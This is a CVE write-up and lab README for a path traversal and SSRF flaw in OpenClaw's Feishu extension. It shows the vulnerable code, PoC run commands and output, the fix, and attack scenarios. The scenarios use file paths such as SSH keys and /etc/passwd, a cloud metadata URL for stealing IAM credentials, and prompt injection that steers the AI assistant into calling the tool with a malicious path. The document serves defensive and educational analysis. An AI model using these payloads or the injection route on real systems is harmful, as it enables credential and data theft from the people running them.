# CVE-2026-26321 - OpenClaw Path Traversal / Local File Disclosure via Feishu Extension

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field | Value |
|---|---|
| CVE | CVE-2026-26321 |
| Component | [OpenClaw](https://github.com/openclaw/openclaw) |
| Type | CWE-22: Path Traversal, CWE-918: SSRF |
| CVSS | 7.5 (High) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| EPSS | 0.1% (23.4th percentile) |
| Affected | OpenClaw < 2026.2.14 |
| Fix | Upgrade to v2026.2.14+ (commit `5b4121d`) |
| Author | Exploit Intelligence Platform |
| Date | 2026-02-28 |

## Overview

OpenClaw versions prior to 2026.2.14 contain a path traversal and local file disclosure vulnerability in the Feishu (Lark) messaging extension. The `sendMediaFeishu()` function accepts attacker-controlled `mediaUrl` values and, when they resolve to local filesystem paths, reads them directly from disk using `fs.readFileSync()` with no sandboxing or directory restrictions. The file contents are then uploaded to the Feishu API and sent as a message, enabling full exfiltration of sensitive data including credentials, SSH keys, and configuration files.

A secondary SSRF vulnerability exists in both `media.ts` and `docx.ts` where bare `fetch()` calls are made on attacker-controlled URLs without private IP blocking or DNS rebinding protection.

## Affected Versions

- **Vulnerable:** All OpenClaw versions **before 2026.2.14** (npm package: `openclaw`)
- **Fixed in:** v2026.2.14

## Root Cause

The vulnerability stems from the `isLocalPath()` helper function in `extensions/feishu/src/media.ts`, which classifies a broad set of input strings as local filesystem paths — including strings starting with `/`, `~`, drive letters (`C:\`), `file://` protocol URLs, and any string that fails `new URL()` parsing (a catch-all fallthrough). When `isLocalPath()` returns `true`, the `sendMediaFeishu()` function reads the path directly with `fs.readFileSync()`:

```typescript
function isLocalPath(urlOrPath: string): boolean {
  if (urlOrPath.startsWith("/") || urlOrPath.startsWith("~") || /^[a-zA-Z]:/.test(urlOrPath)) {
    return true;
  }
  try {
    const url = new URL(urlOrPath);
    return url.protocol === "file:";
  } catch {
    return true; // <-- any non-URL string treated as local path
  }
}

// In sendMediaFeishu():
if (isLocalPath(mediaUrl)) {
  const filePath = mediaUrl.startsWith("~")
    ? mediaUrl.replace("~", process.env.HOME ?? "")
    : mediaUrl.replace("file://", "");
  buffer = fs.readFileSync(filePath);  // <-- ARBITRARY FILE READ
}
```

No path validation, directory whitelisting, or sandboxing is applied. An attacker who can influence the `mediaUrl` parameter — either through direct tool invocation or prompt injection against the AI assistant — can read any file accessible to the OpenClaw process. The read contents are uploaded to Feishu via `uploadFileFeishu()` and sent as a message to a target chat, completing the exfiltration chain.

The secondary SSRF vulnerability exists in the remote URL path of the same function (bare `fetch(mediaUrl)` with no SSRF protection) and in `docx.ts`'s `downloadImage()` function, which fetches arbitrary URLs extracted from markdown image references.

## Lab Setup

### Prerequisites

- Docker with compose plugin
- ~2 GB disk space (Node.js base image + monorepo dependencies)
- Pre-built Docker image (`cve-2026-26321-vulnerable:latest`) — the source tree is not included in this directory due to size

### Build and Start

```bash
cd CVE-2026-26321
docker compose up -d
```

### Container Architecture

| Container | Role | Image Base |
|---|---|---|
| `cve-2026-26321-vulnerable` | OpenClaw v2026.2.13 (vulnerable) | `node:22-bookworm` |

This is a single-container lab — no external services, databases, or real Feishu credentials are required. The vulnerable code is exercised directly via vitest with mocked Feishu API dependencies.

### Sentinel Files

The Dockerfile creates these target files for safe PoC demonstration:

| Path | Content | Purpose |
|---|---|---|
| `/tmp/cve-secret.txt` | `CVE-2026-26321-SECRET-DATA-EXFILTRATED` | Primary PoC target |
| `/tmp/fake-passwd` | `root:x:0:0:root:/root:/bin/bash` | Simulated /etc/passwd |
| `/tmp/fake-env` | `OPENCLAW_API_KEY=sk-secret-key-12345` | Simulated leaked credentials |
| `/tmp/fake-ssh-key` | RSA private key (fake) | Simulated SSH key exfiltration |

### Stop Lab

```bash
cd CVE-2026-26321
docker compose down
```

## PoC Usage

Three PoC scripts are provided, each targeting a distinct attack vector. All scripts are Python orchestrators that deploy vitest exploit tests into the running container.

### Vector 1: Local File Read (Primary)

Demonstrates arbitrary file read via `sendMediaFeishu()` with attacker-controlled `mediaUrl`.

```bash
cd poc/
python3 poc.py
```

**Expected output:**

```
╔══════════════════════════════════════════════════════════════╗
║  CVE-2026-26321 — Proof of Concept Exploit                  ║
║  OpenClaw < 2026.2.14 — Path Traversal / Local File Read    ║
║  Feishu Extension: sendMediaFeishu() arbitrary file read     ║
╚══════════════════════════════════════════════════════════════╝

[+] Container 'cve-2026-26321-vulnerable' is running
[+] isLocalPath() function: PRESENT (vulnerable)
[+] fs.readFileSync(): PRESENT (vulnerable)

=== CVE-2026-26321: Direct File Read Demonstration ===

[EXFILTRATED] System passwd file
  mediaUrl: "/etc/passwd"
  isLocalPath() -> true
  fs.readFileSync("/etc/passwd") -> 878 bytes

[EXFILTRATED] Sentinel secret file
  mediaUrl: "/tmp/cve-secret.txt"
  isLocalPath() -> true
  fs.readFileSync("/tmp/cve-secret.txt") -> 39 bytes
  Content: "CVE-2026-26321-SECRET-DATA-EXFILTRATED"

=== Vulnerability Confirmed: Arbitrary Local File Read ===

 ✓ EXPLOIT: reads /etc/passwd via absolute path
 ✓ EXPLOIT: reads sentinel file /tmp/cve-secret.txt
 ✓ EXPLOIT: reads file via file:// protocol URI
 ✓ EXPLOIT: exfiltrates simulated API credentials
 ✓ EXPLOIT: exfiltrates simulated SSH private key
 ✓ EXPLOIT: invalid URL string treated as local path
 ✓ EXPLOIT: full chain — file read → upload → message send

 Test Files  1 passed (1)
      Tests  12 passed (12)

  [CONFIRMED] CVE-2026-26321 successfully exploited!
```

### Vector 2: SSRF via media.ts

Demonstrates SSRF via bare `fetch()` in `sendMediaFeishu()` when `mediaUrl` is a remote URL.

```bash
cd poc/
python3 poc_vector2_ssrf.py
```

**Expected output:**

```
 ✓ EXPLOIT: SSRF to AWS metadata endpoint (169.254.169.254)
 ✓ EXPLOIT: SSRF to internal service (http://internal-api:8080)
 ✓ EXPLOIT: SSRF to localhost service (http://127.0.0.1:3000)

 Test Files  1 passed (1)
      Tests  3 passed (3)
```

### Vector 3: SSRF via docx.ts

Demonstrates SSRF via `downloadImage()` processing markdown image URLs.

```bash
cd poc/
python3 poc_vector3_docx_ssrf.py
```

**Expected output:**

```
 ✓ extractImageUrls extracts internal/private URLs from markdown
 ✓ downloadImage calls bare fetch() without SSRF protection
 ✓ full SSRF chain: markdown → extractImageUrls → downloadImage → fetch

 Test Files  1 passed (1)
      Tests  3 passed (3)
```

### Standalone Verification (No PoC Framework)

To quickly verify the vulnerability without vitest:

```bash
docker exec cve-2026-26321-vulnerable node /app/verify-vuln.mjs
```

## Verification

### Vulnerable (v2026.2.13) — Before Fix

```
[+] isLocalPath() function:  PRESENT (vulnerable)
[+] fs.readFileSync():       PRESENT (vulnerable)
[+] Bare fetch(mediaUrl):    PRESENT (SSRF-vulnerable)

isLocalPath("/etc/passwd")           = true   → fs.readFileSync reads file ✓
isLocalPath("/tmp/cve-secret.txt")   = true   → fs.readFileSync reads file ✓
isLocalPath("file:///etc/shadow")    = true   → fs.readFileSync reads file ✓
isLocalPath("not-a-valid-url")       = true   → fs.readFileSync reads file ✓

[EXFILTRATED] /tmp/cve-secret.txt → "CVE-2026-26321-SECRET-DATA-EXFILTRATED"
[EXFILTRATED] /etc/passwd → "root:x:0:0:root:/root:/bin/bash..."

RESULT: VULNERABLE — 18/18 exploit tests pass
```

### Patched (v2026.2.14) — After Fix

```
[-] isLocalPath() function:  NOT FOUND (removed by fix)
[-] fs.readFileSync():       NOT FOUND (removed by fix)
[-] Bare fetch(mediaUrl):    NOT FOUND (replaced with fetchWithSsrFGuard)

All media fetching routed through loadWebMedia() → fetchRemoteMedia() → fetchWithSsrFGuard():
  ✗ Local file paths:   REJECTED (only http/https protocols supported)
  ✗ file:// protocol:   REJECTED (protocol validation)
  ✗ Private IPs:        REJECTED (DNS pinning + IP block list)
  ✗ Cloud metadata:     REJECTED (169.254.x.x blocked)

RESULT: NOT VULNERABLE — all exploit vectors blocked
```

## Fix

The fix was applied in commit [`5b4121d`](https://github.com/openclaw/openclaw/commit/5b4121d6011a48c71e747e3c18197f180b872c5d) (2026-02-14) and released in v2026.2.14.

### Changes

1. **`media.ts`** — Removes `isLocalPath()` function entirely. Removes all `fs.readFileSync()` calls and bare `fetch()` calls. Replaces with `getFeishuRuntime().media.loadWebMedia()`, which:
   - Routes all fetching through `fetchWithSsrFGuard()` — DNS pinning and private/internal IP blocking
   - Validates protocol is `http:` or `https:` only (no `file://` protocol)
   - Does NOT support local filesystem paths at all
   - Enforces configurable byte size limits (`mediaMaxMb`, default 30 MB)

2. **`docx.ts`** — Replaces bare `fetch(url)` in `downloadImage()` with `getFeishuRuntime().channel.media.fetchRemoteMedia()`, which provides the same SSRF protections and size limits.

3. **Tests added** — `media.test.ts` and `docx.test.ts` include test cases verifying that blocked URLs (private IPs, cloud metadata endpoints) are properly rejected.

The fix is a **root cause elimination** — the dangerous code paths are removed entirely rather than filtered, eliminating bypass potential. The core helpers (`loadWebMedia`, `fetchRemoteMedia`, `fetchWithSsrFGuard`) are mature, tested, and already used by other OpenClaw extensions (e.g., MS Teams).

### Fix Assessment

**The fix is thorough and complete.** No bypass vectors were identified.

## Attack Scenarios

### Scenario 1: Direct Tool Call — Local File Exfiltration

1. Attacker has access to OpenClaw's tool-calling interface
2. Invokes `sendMediaFeishu` with `mediaUrl: "/etc/passwd"` (or `/proc/self/environ`, `~/.ssh/id_rsa`, etc.)
3. `isLocalPath()` returns `true` → `fs.readFileSync()` reads the file
4. File contents uploaded to Feishu and sent to attacker's chat

### Scenario 2: Prompt Injection — Indirect File Exfiltration

1. Attacker crafts a prompt injection payload in content processed by the AI
2. AI is tricked into calling the Feishu media tool with a malicious local path
3. File exfiltration occurs through the same code path as Scenario 1
4. No direct authentication required — only influence over processed content

### Scenario 3: SSRF — Cloud Credential Theft

1. Attacker provides `mediaUrl = "http://169.254.169.254/latest/meta-data/iam/security-credentials/role"`
2. `isLocalPath()` returns `false` (valid HTTP URL)
3. `fetch()` is called without SSRF protection
4. AWS IAM credentials fetched, uploaded to Feishu, sent to attacker

### Scenario 4: SSRF via Document — Internal Service Access

1. Attacker triggers `feishu_doc` tool with markdown: `![img](http://internal-admin-api:8080/users)`
2. `extractImageUrls()` extracts the URL, `downloadImage()` calls bare `fetch()`
3. Internal API response data is exfiltrated

## Files

| File | Description |
|---|---|
| [README.md](README.md) | This file — full writeup |
| [poc/poc.py](poc/poc.py) | Primary PoC orchestrator: local file read exploit (12 tests) |
| [poc/cve-2026-26321-poc.test.ts](poc/cve-2026-26321-poc.test.ts) | Vitest exploit suite for sendMediaFeishu() |
| [poc/poc_vector2_ssrf.py](poc/poc_vector2_ssrf.py) | SSRF PoC orchestrator: media.ts bare fetch() (3 tests) |
| [poc/poc_vector2_ssrf.test.ts](poc/poc_vector2_ssrf.test.ts) | Vitest exploit suite for media.ts SSRF |
| [poc/poc_vector3_docx_ssrf.py](poc/poc_vector3_docx_ssrf.py) | SSRF PoC orchestrator: docx.ts downloadImage() (3 tests) |
| [poc/poc_vector3_docx_ssrf.test.ts](poc/poc_vector3_docx_ssrf.test.ts) | Vitest exploit suite for docx.ts SSRF |
| [Dockerfile.vulnerable](Dockerfile.vulnerable) | Vulnerable container (OpenClaw v2026.2.13) |
| [docker-compose.yml](docker-compose.yml) | Docker Compose lab environment |
| [verify-vuln.mjs](verify-vuln.mjs) | Standalone vulnerability verification script |
| [intel_brief.md](intel_brief.md) | CVE intelligence brief |
| [vulnerability_analysis.md](vulnerability_analysis.md) | Root cause analysis and fix assessment |
| [lab_build_report.md](lab_build_report.md) | Lab build and verification report |
| [poc_verification_report.md](poc_verification_report.md) | PoC test results |

## References

| Type | URL |
|---|---|
| Fix Commit | https://github.com/openclaw/openclaw/commit/5b4121d6011a48c71e747e3c18197f180b872c5d |
| Vendor Advisory (GHSA) | https://github.com/openclaw/openclaw/security/advisories/GHSA-8jpq-5h99-ff5r |
| NVD | https://nvd.nist.gov/vuln/detail/CVE-2026-26321 |
| Patched Release (v2026.2.14) | https://github.com/openclaw/openclaw/releases/tag/v2026.2.14 |
| Repository | https://github.com/openclaw/openclaw |
| npm Package | https://www.npmjs.com/package/openclaw |

## Timeline

| Date | Event |
|---|---|
| 2026-02-14 | Fix committed (`5b4121d`) by Peter Steinberger, credited @mbelinky |
| 2026-02-14 | v2026.2.14 released with fix |
| 2026-02-19 | CVE-2026-26321 published |
| 2026-02-19 | GHSA-8jpq-5h99-ff5r advisory published |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2026-26321 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. This project follows responsible disclosure practices.
